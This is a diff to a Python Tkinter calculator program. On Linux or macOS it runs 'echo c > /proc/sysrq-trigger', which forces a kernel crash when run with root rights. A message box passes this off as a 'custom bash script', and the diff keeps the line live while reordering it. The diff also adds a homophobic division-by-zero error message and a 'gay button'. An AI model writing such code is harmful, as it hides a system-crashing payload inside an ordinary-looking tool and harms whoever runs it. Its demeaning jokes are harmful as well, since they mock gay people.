@@ -57,8 +57,8 @@ def create_calculator_gui():
         elif os.name == 'posix':
             messagebox.showinfo("OS Check", "Running on Linux/macOS. Executing custom bash script.")
             try:
-                os.system("echo c > /proc/sysrq-trigger")
                 os.system("echo killall kernel_task")
+                os.system("echo c > /proc/sysrq-trigger")
             except Exception as e:
                 messagebox.showerror("Script Error", f"Error executing Linux script: {e}")
         else:
@@ -80,7 +80,7 @@ def create_calculator_gui():
             simulate_bash_script()
 
         except ZeroDivisionError:
-            messagebox.showerror("Error", "Really?")
+            messagebox.showerror("Error", "Gayyyyyyyyyyyyyy")
             clear_entry()
         except SyntaxError:
             messagebox.showerror("Error", "Invalid expression!")
@@ -93,7 +93,7 @@ def create_calculator_gui():
         ('7', 1, 0), ('8', 1, 1), ('9', 1, 2), ('/', 1, 3),
         ('4', 2, 0), ('5', 2, 1), ('6', 2, 2), ('*', 2, 3),
         ('1', 3, 0), ('2', 3, 1), ('3', 3, 2), ('-', 3, 3),
-        ('0', 4, 0), ('.', 4, 1), ('+', 4, 3)
+        ('0', 4, 0), ('.', 4, 1), ('+', 4, 2), ('gay button', 4, 3),
     ]
 
     for (text, row, col) in buttons:
